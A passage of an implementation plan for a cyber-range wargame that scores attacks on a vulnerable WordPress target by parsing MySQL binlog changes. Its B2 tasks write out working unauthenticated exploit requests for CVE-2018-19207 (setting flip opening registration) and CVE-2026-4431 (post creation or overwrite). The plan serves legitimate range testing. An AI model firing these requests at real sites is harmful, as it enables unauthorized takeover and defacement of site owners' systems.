      action: "wpgdprc_process_action"
      data: '{"type":"save_setting","append":false,"option":"users_can_register","value":"1"}'
```

Replace with the confirmed shape. (A single case may flip one option; the acceptance below checks `users_can_register`. If the exploit needs two requests to flip both options, keep this one case for the primary flip — `users_can_register` — which alone satisfies the objective, and note that `default_role` is a second optional request.) No new benign case is required here; `corp-normal-registration` (B2.1) and `corp-normal-post-read` (B2.3) cover benign traffic.

- [ ] **Step 4: Write and run the live acceptance**

```python
# test/test_corp_cve_option_flip.py
import requests

from conftest import PLATFORM_URL
from range import run


def _option(name):
    return run("corp-db", [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        f"SELECT option_value FROM wp_options WHERE option_name='{name}';",
    ]).stdout.strip()


def test_the_flip_turns_self_registration_on(stack_is_up):
    session_id = requests.post(
        f"{PLATFORM_URL}/api/sessions/", json={"scenario": "corp"}, timeout=120
    ).json()["id"]
    fired = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/attacks/",
        json={"case": "corp-option-flip"}, timeout=120,
    )
    assert fired.status_code == 201, fired.text
    assert _option("users_can_register") == "1"
```

Run: `cd test && ../.venv/bin/python -m pytest test_corp_cve_option_flip.py -v`
Expected: PASS. (Order note: run this acceptance before B2.1's, or rely on the per-rebuild clean state — `corp-db` keeps no volume, so `bin/verify`'s rebuild resets options. Within one live run, flipping `users_can_register` does not undo the rogue-admin check.)

- [ ] **Step 5: Catalogue check and commit**

```bash
cd platform && ../.venv/bin/python -m pytest tests/test_catalogue.py -v && cd ..
git add redteam/cases/corp.yaml platform/tests/fixtures/corp-option-flip.binlog platform/tests/fixtures/corp-columns.json test/test_corp_cve_option_flip.py
git commit -m "feat(corp): CVE-2018-19207 option-flip case proven live, binlog fixture captured"
```

---

### Task B2.3: CVE-2026-4431 — unauthorized content write (Easy Post Submission 2.3.0)

**Files:**
- Modify: `redteam/cases/corp.yaml`
- Create: `platform/tests/fixtures/corp-content-write.binlog`
- Test: `test/test_corp_cve_content_write.py`

**Interfaces:**
- Produces: a malicious case `corp-content-write` (`expect: "rbsm_submit_post"`) that creates or overwrites a `wp_posts` row via the unauthenticated `admin-ajax` `rbsm_submit_post` action; a benign case `corp-normal-post-read`; a binlog fixture of the `wp_posts` INSERT/UPDATE.

- [ ] **Step 1: Reproduce live via admin-ajax**

```bash
docker compose exec platform python3 - <<'PY'
import requests
r = requests.post(
    "http://board.com/wp-admin/admin-ajax.php",
    headers={"Host": "corp.com"},
    params={
        "action": "rbsm_submit_post",
        "rbsm_title": "Unauthorized",
        "rbsm_content": "written without an account",
    },
    timeout=20,
)
print(r.status_code, r.text[:200])
PY
```

No `postId` creates a post; adding a `postId` of an existing published post overwrites/unpublishes it (per the Wordfence advisory). Confirm the exact action name and field names against 2.3.0 live. If the handler reads strictly `$_POST`, see B2.0: swap to the alternate **WordPress CORE 4.7.1 CVE-2017-1001000** (use the official `wordpress:4.7.1` image and the REST content-modification request) or **Trash Duplicate and 301 Redirect ≤1.9 CVE-2024-13468** (content deletion). Keep `expect` aligned to whichever ships.

- [ ] **Step 2: Confirm the committed change and capture the fixture**

```bash
docker compose exec corp-db mysql -uwordpress -pwordpress wordpress -e \
  "SELECT ID,post_status,post_title FROM wp_posts WHERE post_title='Unauthorized';"
docker compose exec corp-db sh -c \
  'mysqlbinlog --base64-output=DECODE-ROWS --verbose /var/lib/mysql/binlog.* 2>/dev/null' \
  > platform/tests/fixtures/corp-content-write.binlog
```

Expected: a new `wp_posts` row (INSERT). Confirm the `wp_posts` `@N` positions (`ID`, `post_status`, `post_content`, `post_title`) in `corp-columns.json` against this fixture.

- [ ] **Step 3: Add the cases**

```yaml
- name: corp-content-write
  malicious: true
  stage: complete-mission
  technique: T1565
  pattern: CAPEC-242
  expect: "rbsm_submit_post"
  correlation: marker
  request:
    method: POST
    path: /wp-admin/admin-ajax.php
    params:
      action: "rbsm_submit_post"
      rbsm_title: "Unauthorized"
      rbsm_content: "written without an account"

- name: corp-normal-post-read
  malicious: false
  correlation: marker
  request:
    method: GET
    path: /
```

Replace with the confirmed shape. `corp-normal-post-read` reads the public front page and commits nothing, keeping TN > 0.

- [ ] **Step 4: Write and run the live acceptance**

```python
# test/test_corp_cve_content_write.py
import requests

from conftest import PLATFORM_URL
from range import run


def _post_count():
    return int(run("corp-db", [
        "mysql", "-uwordpress", "-pwordpress", "wordpress", "-N", "-e",
        "SELECT COUNT(*) FROM wp_posts WHERE post_type='post';",
    ]).stdout.strip() or "0")


def test_the_content_write_commits_a_post_row(stack_is_up):
    before = _post_count()
    session_id = requests.post(
        f"{PLATFORM_URL}/api/sessions/", json={"scenario": "corp"}, timeout=120
    ).json()["id"]
    fired = requests.post(
        f"{PLATFORM_URL}/api/sessions/{session_id}/attacks/",
        json={"case": "corp-content-write"}, timeout=120,
    )
    assert fired.status_code == 201, fired.text
    assert _post_count() > before
```

Run: `cd test && ../.venv/bin/python -m pytest test_corp_cve_content_write.py -v`
Expected: PASS.

- [ ] **Step 5: Catalogue check and commit**

```bash
cd platform && ../.venv/bin/python -m pytest tests/test_catalogue.py -v && cd ..
git add redteam/cases/corp.yaml platform/tests/fixtures/corp-content-write.binlog platform/tests/fixtures/corp-columns.json test/test_corp_cve_content_write.py
git commit -m "feat(corp): CVE-2026-4431 content-write case proven live, binlog fixture captured"
```

---

## PHASE B3 — the `effect_observed` objective model

Test-first, unit-level with the B2 fixtures. No new pip dependency; nothing in core. The three view gates dispatch on `objective_model`; crediting comes only from committed rows, never an alert.

### Task B3.1: register `corp` and the `effect_observed` model

**Files:**
- Modify: `platform/wargames.py` (`WARGAMES` gains `corp`)
- Test: `platform/tests/test_wargames_objective_model.py`, `platform/tests/test_objective_model_values.py`

**Interfaces:**
- Produces: `wargames.objective_model("corp") == "effect_observed"`; `wargames.judged("corp") is True`; the catalogue lists `corp` with `public_url == "http://corp.com"`.

- [ ] **Step 1: Extend the failing tests**

Add to `platform/tests/test_wargames_objective_model.py`:

```python
def test_corp_is_effect_observed_and_counts_as_judged():
    assert wargames.objective_model("corp") == "effect_observed"
    assert wargames.judged("corp") is True
```

Change `platform/tests/test_objective_model_values.py::test_every_wargame_model_is_loot_verified_or_none` to admit the new value:

```python
def test_every_wargame_model_is_a_known_value():
    for entry in wargames.WARGAMES.values():
        assert entry["objective_model"] in {"loot_verified", "effect_observed", "none"}, entry
```

- [ ] **Step 2: Run to verify it fails**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_wargames_objective_model.py tests/test_objective_model_values.py -v`
Expected: FAIL — `corp` is not in `WARGAMES`.

- [ ] **Step 3: Add the `corp` entry to `platform/wargames.py`**

In the `WARGAMES` dict, after the `board` entry:

```python
    "corp": {
        "id": "corp",
        "name": "Northwind community",
        "description": (
            "A WordPress company site on MySQL, behind the WAF and the IDS. "
            "Three unpatched plugins carry unauthenticated broken-access-control "
            "CVEs the default rules cannot see; the platform scores by watching "
            "the target's own committed database changes."
        ),
        "case_file": "corp.yaml",
        "public_url": "http://corp.com",
        "objective_model": "effect_observed",
    },
```

`public_url` is a literal (the board uses `settings.PUBLIC_TARGET_URL` only because it was the default target); `wargames.host("corp")` returns `corp.com` from this.

- [ ] **Step 4: Run to verify it passes**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_wargames_objective_model.py tests/test_objective_model_values.py tests/test_catalogue.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add platform/wargames.py platform/tests/test_wargames_objective_model.py platform/tests/test_objective_model_values.py
git commit -m "feat(corp): register corp wargame with the effect_observed model"
```

---

### Task B3.2: the `corp` objectives spec

**Files:**
- Create: `wargames/corp/objectives.yaml`
- Test: `platform/tests/test_corp_objectives_spec.py`

**Interfaces:**
- Produces: `wargames.objectives("corp")` with a `secret` naming the `corp-db` read channel (role `corp-db`, no WP URL) and three tiers keyed `corp-rogue-admin` (difficulty 5, `effect: rogue_admin`), `corp-self-registration` (difficulty 4, `effect: option_flip`), `corp-content-overwrite` (difficulty 3, `effect: content_write`).

- [ ] **Step 1: Write the failing test**

```python
# platform/tests/test_corp_objectives_spec.py
import wargames


def test_corp_reads_state_from_the_corp_db_container_not_a_wp_endpoint():
    secret = wargames.objectives("corp")["secret"]
    assert secret["role"] == "corp-db"
    assert "corp-db" in secret["read_path"]
    assert "http" not in secret["read_path"]


def test_corp_declares_the_three_graded_objectives():
    tiers = {t["key"]: t for t in wargames.objectives("corp")["tiers"]}
    assert set(tiers) == {"corp-rogue-admin", "corp-self-registration", "corp-content-overwrite"}
    assert tiers["corp-rogue-admin"]["difficulty"] == 5
    assert tiers["corp-rogue-admin"]["effect"] == "rogue_admin"
    assert tiers["corp-self-registration"]["difficulty"] == 4
    assert tiers["corp-self-registration"]["effect"] == "option_flip"
    assert tiers["corp-content-overwrite"]["difficulty"] == 3
    assert tiers["corp-content-overwrite"]["effect"] == "content_write"


def test_every_corp_tier_carries_an_integer_difficulty_and_a_name():
    for tier in wargames.objectives("corp")["tiers"]:
        assert isinstance(tier["difficulty"], int)
        assert isinstance(tier["name"], str) and tier["name"]
```

- [ ] **Step 2: Run to verify it fails**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_objectives_spec.py -v`
Expected: FAIL — `wargames/corp/objectives.yaml` does not exist.

- [ ] **Step 3: Write `wargames/corp/objectives.yaml`**

```yaml
secret:
  scope: wp_state
  role: corp-db
  read_path: estate://corp-db
tiers:
  - key: corp-rogue-admin
    name: Rogue administrator created
    category: Privilege Escalation
    difficulty: 5
    effect: rogue_admin
  - key: corp-self-registration
    name: Site opened to admin self-registration
    category: Defense Evasion
    difficulty: 4
    effect: option_flip
  - key: corp-content-overwrite
    name: Unauthorized content created or overwritten
    category: Impact
    difficulty: 3
    effect: content_write
```

The existing `wargames.checked_objectives` validator already requires a truthy `secret.read_path` and `tiers` with `key`/`name`/integer `difficulty`; `read_path: estate://corp-db` satisfies it while naming the DB-exec channel rather than a WP URL. The extra `role` and `effect` keys pass through untouched; `effect` is read by the effect module, and the snapshot/observe queries themselves live in `effect.py` (they are not read from `read_path`).

- [ ] **Step 4: Run to verify it passes**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_objectives_spec.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add wargames/corp/objectives.yaml platform/tests/test_corp_objectives_spec.py
git commit -m "feat(corp): three effect_observed objectives, difficulty 5/4/3"
```

---

### Task B3.3: the state snapshot and the session-start gate

**Files:**
- Create: `platform/api/effect.py` (snapshot half)
- Modify: `platform/api/views.py` (`sessions` POST dispatches the snapshot)
- Modify: `platform/tests/conftest.py` (`no_real_effect_read` autouse guard)
- Test: `platform/tests/test_corp_session_start.py`

**Interfaces:**
- Produces:
  - `effect.StateUnavailable(RuntimeError)`
  - `effect.snapshot(runner) -> dict` returning `{"admins": [int], "options": {str: str}, "posts": [int]}`, read by running read-only `mysql -N -e "SELECT ..."` in the `corp-db` container through the given substrate `runner`; raises `StateUnavailable` on any failure. No HTTP, no Django import, no WordPress instrumentation — the same container channel the binlog read uses.
  - `api.views.sessions` POST stores the snapshot onto `Session.baseline` for an `effect_observed` scenario (and `None` when the channel is down), exactly as the `loot_verified` branch does.

- [ ] **Step 1: Write the failing test**

```python
# platform/tests/test_corp_session_start.py
from unittest.mock import patch

import pytest

from api.models import Session

pytestmark = pytest.mark.django_db

STATE = {
    "admins": [1],
    "options": {"users_can_register": "0", "default_role": "subscriber"},
    "posts": [2, 3],
}


def _start_corp(client):
    with patch("api.views.effect.snapshot", return_value=dict(STATE)):
        return client.post_json("/api/sessions/", {"scenario": "corp"}).json()["id"]


def test_a_corp_session_snapshots_the_target_state_at_start(client):
    session_id = _start_corp(client)
    assert Session.objects.get(pk=session_id).baseline == STATE


def test_a_corp_session_opens_blind_when_the_state_read_fails(client):
    from api import effect
    with patch("api.views.effect.snapshot",
               side_effect=effect.StateUnavailable("corp down")):
        session_id = client.post_json("/api/sessions/", {"scenario": "corp"}).json()["id"]
    assert Session.objects.get(pk=session_id).baseline is None


def test_corp_lists_its_three_objectives_unsolved(client):
    by_key = {o["key"]: o for o in client.get("/api/wargames/corp/objectives/").json()}
    assert set(by_key) == {"corp-rogue-admin", "corp-self-registration", "corp-content-overwrite"}
    for tier in by_key.values():
        assert isinstance(tier["difficulty"], int)
        assert tier["solved"] is False and tier["solved_at"] is None
```

- [ ] **Step 2: Run to verify it fails**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_session_start.py -v`
Expected: FAIL — `api.effect` does not exist / `effect` is not imported in views.

- [ ] **Step 3: Create `platform/api/effect.py` (snapshot half)**

```python
from __future__ import annotations

MYSQL = ["mysql", "-N", "-uwordpress", "-pwordpress", "wordpress", "-e"]

ADMIN_IDS = (
    "SELECT user_id FROM wp_usermeta WHERE meta_key='wp_capabilities' "
    "AND meta_value LIKE '%administrator%';"
)
WATCHED_OPTIONS = (
    "SELECT option_name,option_value FROM wp_options "
    "WHERE option_name IN ('users_can_register','default_role');"
)
PUBLISHED_POSTS = (
    "SELECT ID FROM wp_posts WHERE post_status='publish' AND post_type='post';"
)


class StateUnavailable(RuntimeError):
    pass


def _rows(runner, sql: str) -> list[list[str]]:
    try:
        ran = runner(MYSQL + [sql], timeout=30.0)
    except Exception as exc:
        raise StateUnavailable(f"could not read corp-db: {exc}") from exc
    out = ran.stdout if hasattr(ran, "stdout") else str(ran)
    return [line.split("\t") for line in out.splitlines() if line.strip()]


def snapshot(runner) -> dict:
    admins = [int(row[0]) for row in _rows(runner, ADMIN_IDS)]
    options = {row[0]: row[1] for row in _rows(runner, WATCHED_OPTIONS) if len(row) >= 2}
    posts = [int(row[0]) for row in _rows(runner, PUBLISHED_POSTS)]
    return {"admins": admins, "options": options, "posts": posts}
```

`effect.py` imports no Django and makes no HTTP call. `snapshot` runs three read-only `SELECT`s in `corp-db` through the substrate runner — the same container channel `read_changes` (B3.5) uses for `mysqlbinlog`. `mysql -N ... wordpress -e` selects the `wordpress` database (so unqualified table names resolve) and suppresses column headers; rows come back tab-separated. The `mysql` client ships in the MySQL image, so there is no new pip dependency.

- [ ] **Step 4: Dispatch the snapshot in `api.views.sessions`**

Add `from api import effect` beside `from api import loot` at the top of `platform/api/views.py`. `RangeUnavailable` is already imported there (from `range.ports`). Replace the baseline block in `sessions` (currently `if wargames.objective_model(scenario) == "loot_verified": ...`) with:

```python
    baseline = []
    model = wargames.objective_model(scenario)
    if model == "loot_verified":
        try:
            baseline = loot.ground_truth(scenario)
        except loot.GroundTruthUnavailable:
            baseline = None
    elif model == "effect_observed":
        try:
            baseline = effect.snapshot(substrate().runner("corp-db"))
        except (effect.StateUnavailable, RangeUnavailable):
            baseline = None
```

Building `substrate().runner("corp-db")` only constructs a closure (it resolves the `corp-db` role from the declaration added in B1.1); no `docker exec` runs until the closure is called inside `snapshot`. In unit tests `effect.snapshot` is patched (Step 6 guard), so the closure is never invoked and no real container is touched.

- [ ] **Step 5: Extend the objectives catalogue gate**

In `api.views.wargame_objectives`, the `model == "none"` early-return stays; `_loot_catalogue(wargames.objectives(...))` already builds the unsolved tier list generically from `tiers`, so it serves `effect_observed` unchanged. Confirm `test_corp_session_start.test_corp_lists_its_three_objectives_unsolved` passes against it; no code change is needed beyond the `corp` entry already added.

- [ ] **Step 6: Add the `no_real_effect_read` autouse guard**

Append to `platform/tests/conftest.py`, mirroring `no_real_board_read`. `snapshot` now takes a runner argument, so the refusal stub accepts any args. Add only the `snapshot` patch here; B3.5 Step 3 extends the guard with the `read_changes` patch once `read_changes` exists (patching an attribute before it is defined would error):

```python
@pytest.fixture(autouse=True)
def no_real_effect_read(request):
    if request.node.get_closest_marker("reads_target_state"):
        yield
        return
    from api import effect

    def refuse_snapshot(*args, **kwargs):
        raise effect.StateUnavailable(
            "this unit test supplied no target; effect.snapshot was refused. A "
            "test that needs it must patch api.views.effect.snapshot or mark "
            "reads_target_state"
        )

    with patch("api.views.effect.snapshot", refuse_snapshot):
        yield
```

- [ ] **Step 7: Run to verify it passes**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_session_start.py tests/test_loot_session_start.py -v`
Expected: PASS (board loot untouched).

- [ ] **Step 8: Commit**

```bash
git add platform/api/effect.py platform/api/views.py platform/tests/conftest.py platform/tests/test_corp_session_start.py
git commit -m "feat(corp): session-start state snapshot read from the corp-db container"
```

---

### Task B3.4: the binlog parser (pure, fixture-tested)

**Files:**
- Modify: `platform/api/effect.py` (parser half)
- Test: `platform/tests/test_effect_parser.py`

**Interfaces:**
- Produces:
  - `effect.Change` — a frozen dataclass `(table: str, kind: str, at: datetime, columns: dict[int, str])`, `kind` in `{"insert", "update", "delete"}`, `at` timezone-aware UTC.
  - `effect.parse_binlog(text: str, since: datetime | None = None) -> list[Change]` — **pure**; parses `mysqlbinlog --base64-output=DECODE-ROWS --verbose` output, one `Change` per `### INSERT/UPDATE/DELETE` row block, timestamped from the preceding `SET TIMESTAMP=<epoch>`; drops changes before `since`.
  - `effect.COLUMNS` — the per-table `@N` position map loaded from the B2 fixture semantics (`wp_users`, `wp_usermeta`, `wp_options`, `wp_posts`).

- [ ] **Step 1: Write the failing test using the B2 fixtures**

```python
# platform/tests/test_effect_parser.py
from datetime import timezone
from pathlib import Path

from api import effect

FIXTURES = Path(__file__).resolve().parent / "fixtures"


def test_the_rogue_admin_binlog_shows_a_usermeta_admin_grant():
    changes = effect.parse_binlog((FIXTURES / "corp-rogue-admin.binlog").read_text())
    grants = [
        c for c in changes
        if c.table == "wp_usermeta"
        and c.columns.get(effect.COLUMNS["wp_usermeta"]["meta_key"]) == "wp_capabilities"
        and "administrator" in (c.columns.get(effect.COLUMNS["wp_usermeta"]["meta_value"]) or "")
    ]
    assert grants
    assert grants[0].at.tzinfo == timezone.utc


def test_the_option_flip_binlog_shows_users_can_register_going_to_one():
    changes = effect.parse_binlog((FIXTURES / "corp-option-flip.binlog").read_text())
    flips = [
        c for c in changes
        if c.table == "wp_options"
        and c.columns.get(effect.COLUMNS["wp_options"]["option_name"]) == "users_can_register"
        and c.columns.get(effect.COLUMNS["wp_options"]["option_value"]) == "1"
    ]
    assert flips


def test_the_content_write_binlog_shows_a_new_post_row():
    changes = effect.parse_binlog((FIXTURES / "corp-content-write.binlog").read_text())
    assert any(c.table == "wp_posts" and c.kind in {"insert", "update"} for c in changes)


def test_changes_before_the_since_mark_are_dropped():
    changes = effect.parse_binlog((FIXTURES / "corp-option-flip.binlog").read_text())
    assert changes
    latest = max(c.at for c in changes)
    from datetime import timedelta
    assert effect.parse_binlog(
        (FIXTURES / "corp-option-flip.binlog").read_text(),
        since=latest + timedelta(seconds=1),
    ) == []
```

- [ ] **Step 2: Run to verify it fails**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_effect_parser.py -v`
Expected: FAIL — `parse_binlog`/`Change`/`COLUMNS` do not exist.

- [ ] **Step 3: Add the parser to `platform/api/effect.py`**

```python
import re
from dataclasses import dataclass
from datetime import datetime, timezone

COLUMNS = {
    "wp_users": {"ID": 1, "user_login": 2},
    "wp_usermeta": {"user_id": 2, "meta_key": 3, "meta_value": 4},
    "wp_options": {"option_name": 2, "option_value": 3},
    "wp_posts": {"ID": 1, "post_status": 8, "post_content": 5, "post_title": 6},
}

_TIMESTAMP = re.compile(r"^SET TIMESTAMP=(\d+)")
_ROW = re.compile(r"^### (INSERT INTO|UPDATE|DELETE FROM) `[^`]+`\.`([a-z_]+)`")
_COLUMN = re.compile(r"^###\s+@(\d+)=(.*)$")


@dataclass(frozen=True)
class Change:
    table: str
    kind: str
    at: datetime
    columns: dict


def _value(raw: str) -> str:
    raw = raw.strip()
    if raw.endswith("/* ... */"):
        raw = raw[: -len("/* ... */")].strip()
    if len(raw) >= 2 and raw[0] == "'" and raw.rstrip().endswith("'"):
        return raw[1:-1]
    return raw


_KIND = {"INSERT INTO": "insert", "UPDATE": "update", "DELETE FROM": "delete"}


def parse_binlog(text: str, since: datetime | None = None) -> list[Change]:
    changes: list[Change] = []
    at = None
    table = kind = None
    columns: dict[int, str] = {}
    in_set = False

    def flush():
        nonlocal table, kind, columns
        if table and kind and at is not None and columns:
            changes.append(Change(table=table, kind=kind, at=at, columns=dict(columns)))
        table = kind = None
        columns = {}

    for line in text.splitlines():
        stamp = _TIMESTAMP.match(line)
        if stamp:
            at = datetime.fromtimestamp(int(stamp.group(1)), tz=timezone.utc)
            continue
        head = _ROW.match(line)
        if head:
            flush()
            kind = _KIND[head.group(1)]
            table = head.group(2)
            in_set = kind != "update"
            continue
        if table and line.startswith("### SET"):
            in_set = True
            columns = {}
            continue
        if table and line.startswith("### WHERE"):
            in_set = False
            continue
        cell = _COLUMN.match(line)
        if cell and table and in_set:
            columns[int(cell.group(1))] = _value(cell.group(2))
    flush()
    if since is not None:
        changes = [c for c in changes if c.at >= since]
    return changes
```

For an `UPDATE`, only the `### SET` (post-image) columns are kept, which is the committed new value — what every objective is defined on. Confirm `COLUMNS["wp_posts"]` positions against `corp-content-write.binlog` and correct them if this WordPress build's schema differs; the fixture tests lock whatever is true.

- [ ] **Step 4: Run to verify it passes**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_effect_parser.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add platform/api/effect.py platform/tests/test_effect_parser.py
git commit -m "feat(corp): pure mysqlbinlog ROW parser, fixture-tested"
```

---

### Task B3.5: read changes, map to tiers, credit through the scoreboard path

**Files:**
- Modify: `platform/api/effect.py` (`read_changes`, `credited`)
- Modify: `platform/api/views.py` (`_observe_objectives` dispatch; `session_loot` guard unchanged)
- Modify: `platform/tests/conftest.py` (extend `no_real_effect_read` with `read_changes`)
- Test: `platform/tests/test_corp_observe.py`

**Interfaces:**
- Consumes: `Change`, `parse_binlog`, `COLUMNS` (B3.4); `snapshot` baseline shape (B3.3); `scoreboard.CLOCK_SKEW`, `Objective`, `Session.cases`.
- Produces:
  - `effect.read_changes(runner, since: datetime) -> list[Change]` — runs `mysqlbinlog` in the DB container via a substrate `runner` and returns `parse_binlog(out, since)`; raises `StateUnavailable` on a runner failure. (I/O boundary; stubbed in unit tests.)
  - `effect.credited(spec: dict, baseline: dict, changes: list[Change]) -> list[tuple[dict, datetime]]` — **pure**; returns `(tier, at)` for each tier whose defining change appears in `changes` and is absent from `baseline`.
  - `api.views._observe_objectives(session)` for `effect_observed`: reads changes since `session.started_at`, credits a tier only when its change `at` falls inside a malicious case window, writes `Objective` rows (windowed like loot), and returns `{"achieved": int, "total": int}`.

- [ ] **Step 1: Write the failing test**

```python
# platform/tests/test_corp_observe.py
from datetime import datetime, timedelta, timezone
from unittest.mock import patch

import pytest

from api import effect
from api.models import Objective, Session

pytestmark = pytest.mark.django_db

BASELINE = {
    "admins": [1],
    "options": {"users_can_register": "0", "default_role": "subscriber"},
    "posts": [2],
}


def _start(client):
    with patch("api.views.effect.snapshot", return_value=dict(BASELINE)):
        return client.post_json("/api/sessions/", {"scenario": "corp"}).json()["id"]


def _fire(client, session_id, name):
    now = datetime.now(timezone.utc)
    client.post_json(f"/api/sessions/{session_id}/cases/", {
        "case_id": f"c-{name}", "name": name, "malicious": True,
        "correlation": "marker", "started_at": now.isoformat(),
        "ended_at": (now + timedelta(seconds=2)).isoformat(),
    })
    return now


def _rogue_admin_change(at):
    return effect.Change(
        table="wp_usermeta", kind="insert", at=at,
        columns={2: "7", 3: "wp_capabilities", 4: 'a:1:{s:13:"administrator";b:1;}'},
    )


def test_a_rogue_admin_change_in_a_malicious_window_credits_the_objective(client):
    session_id = _start(client)
    at = _fire(client, session_id, "corp-rogue-admin") + timedelta(seconds=1)

    with patch("api.views.effect.read_changes", return_value=[_rogue_admin_change(at)]):
        observed = client.post_json(f"/api/sessions/{session_id}/objectives/")

    assert observed.json()["achieved"] == 1
    assert {o.key for o in Objective.objects.filter(session_id=session_id)} == {"corp-rogue-admin"}


def test_a_change_that_matches_the_baseline_credits_nothing(client):
    session_id = _start(client)
    at = _fire(client, session_id, "corp-rogue-admin") + timedelta(seconds=1)
    same_admin = effect.Change(
        table="wp_usermeta", kind="update", at=at,
        columns={2: "1", 3: "wp_capabilities", 4: 'a:1:{s:13:"administrator";b:1;}'},
    )
    with patch("api.views.effect.read_changes", return_value=[same_admin]):
        observed = client.post_json(f"/api/sessions/{session_id}/objectives/")
    assert observed.json()["achieved"] == 0
    assert not Objective.objects.filter(session_id=session_id).exists()


def test_a_change_outside_every_malicious_window_credits_nothing(client):
    session_id = _start(client)
    _fire(client, session_id, "corp-rogue-admin")
    stray = _rogue_admin_change(datetime.now(timezone.utc) - timedelta(minutes=30))
    with patch("api.views.effect.read_changes", return_value=[stray]):
        observed = client.post_json(f"/api/sessions/{session_id}/objectives/")
    assert observed.json()["achieved"] == 0


def test_an_objective_is_credited_from_the_row_not_from_any_alert(client):
    session_id = _start(client)
    at = _fire(client, session_id, "corp-content-write") + timedelta(seconds=1)
    new_post = effect.Change(table="wp_posts", kind="insert", at=at,
                             columns={1: "99", 8: "publish", 5: "x", 6: "Unauthorized"})
    with patch("api.views.effect.read_changes", return_value=[new_post]):
        client.post_json(f"/api/sessions/{session_id}/objectives/")
    assert Objective.objects.filter(session_id=session_id, key="corp-content-overwrite").exists()


def test_observing_twice_credits_each_objective_once(client):
    session_id = _start(client)
    at = _fire(client, session_id, "corp-rogue-admin") + timedelta(seconds=1)
    with patch("api.views.effect.read_changes", return_value=[_rogue_admin_change(at)]):
        client.post_json(f"/api/sessions/{session_id}/objectives/")
        client.post_json(f"/api/sessions/{session_id}/objectives/")
    assert Objective.objects.filter(session_id=session_id, key="corp-rogue-admin").count() == 1
```

- [ ] **Step 2: Run to verify it fails**

Run: `cd platform && ../.venv/bin/python -m pytest tests/test_corp_observe.py -v`
Expected: FAIL — `read_changes`/`credited` and the `_observe_objectives` dispatch do not exist.

- [ ] **Step 3: Add `read_changes` and `credited` to `platform/api/effect.py`**

```python
BINLOG_CMD = (
    "mysqlbinlog --base64-output=DECODE-ROWS --verbose /var/lib/mysql/binlog.* 2>/dev/null"
)


def read_changes(runner, since: datetime) -> list[Change]:
    try:
        ran = runner(["sh", "-c", BINLOG_CMD], timeout=60.0)
    except Exception as exc:
        raise StateUnavailable(f"could not read the binary log: {exc}") from exc
    return parse_binlog(ran.stdout if hasattr(ran, "stdout") else str(ran), since)


def _admin_grant(change: Change) -> int | None:
    cols = COLUMNS["wp_usermeta"]
    if change.table != "wp_usermeta":
        return None
    if change.columns.get(cols["meta_key"]) != "wp_capabilities":
        return None
    if "administrator" not in (change.columns.get(cols["meta_value"]) or ""):
        return None
    try:
        return int(change.columns.get(cols["user_id"]))
    except (TypeError, ValueError):
        return None


def _option_flip(change: Change) -> bool:
    cols = COLUMNS["wp_options"]
    if change.table != "wp_options":
        return False
    name = change.columns.get(cols["option_name"])
    value = change.columns.get(cols["option_value"])
    return (name == "users_can_register" and value == "1") or (
        name == "default_role" and value == "administrator"
    )


def _content_write(change: Change, baseline_posts: set) -> bool:
    cols = COLUMNS["wp_posts"]
    if change.table != "wp_posts":
        return False
    try:
        post_id = int(change.columns.get(cols["ID"]))
    except (TypeError, ValueError):
        return False
    if change.kind == "insert":
        return True
    return post_id in baseline_posts


def credited(spec: dict, baseline: dict, changes: list[Change]):
    baseline = baseline or {}
    admins = set(baseline.get("admins") or [])
    options = baseline.get("options") or {}
    posts = set(baseline.get("posts") or [])
    tiers = {tier["effect"]: tier for tier in spec["tiers"]}
    out = []
    for change in sorted(changes, key=lambda c: c.at):
        granted = _admin_grant(change)
        if granted is not None and granted not in admins and "rogue_admin" in tiers:
            out.append((tiers["rogue_admin"], change.at))
            continue
        if _option_flip(change) and "option_flip" in tiers:
            cols = COLUMNS["wp_options"]
            name = change.columns.get(cols["option_name"])
            value = change.columns.get(cols["option_value"])
            if options.get(name) != value:
                out.append((tiers["option_flip"], change.at))
                continue
        if _content_write(change, posts) and "content_write" in tiers:
            out.append((tiers["content_write"], change.at))
    return out
```

- [ ] **Step 4: Dispatch in `api.views._observe_objectives`**

Replace `_observe_objectives` in `platform/api/views.py`:

```python
def _observe_objectives(session) -> dict:
    model = wargames.objective_model(session.scenario)
    if model != "effect_observed":
        return {"achieved": 0, "total": session.objectives.count()}

    spec = wargames.objectives(session.scenario)
    total = len(spec["tiers"])
    try:
        changes = effect.read_changes(
            substrate().runner("corp-db"), session.started_at
        )
    except effect.StateUnavailable:
        return {"achieved": session.objectives.count(), "total": total}

    windows = list(session.cases.filter(malicious=True))
    rows = []
    for tier, at in effect.credited(spec, session.baseline, changes):
        case = _effect_window(windows, at)
        if case is None:
            continue
        rows.append(Objective(
            session=session, key=tier["key"], name=tier["name"],
            category=tier.get("category") or "", difficulty=int(tier["difficulty"]),
            achieved_at=at,
            earliest=case.started_at - scoreboard.CLOCK_SKEW,
            latest=case.ended_at + scoreboard.CLOCK_SKEW,
        ))
    before = session.objectives.count()
    Objective.objects.bulk_create(rows, ignore_conflicts=True)
    return {"achieved": session.objectives.count() - before, "total": total}


def _effect_window(cases, at):
    inside = [
        case for case in cases
        if case.started_at - scoreboard.CLOCK_SKEW <= at <= case.ended_at + scoreboard.CLOCK_SKEW
    ]
    return max(inside, key=lambda case: case.started_at, default=None)
```

`Objective.unique_together = (session, key)` plus `ignore_conflicts=True` makes a second observe credit each tier once. The `_breaches`/`_game`/scoreboard path at score time already reads `session.objectives` and attributes detection via `scoreboard.attribute` on `earliest`/`latest` — it needs no change, so the detected/undetected (counts-double-when-undetected) dimension works for `corp` exactly as for the board. `session_loot` keeps its `if objective_model != "loot_verified": raise BadRequest` guard unchanged, so `corp` rejects loot submission.

- [ ] **Step 5: Extend the `no_real_effect_read` guard with `read_changes`**

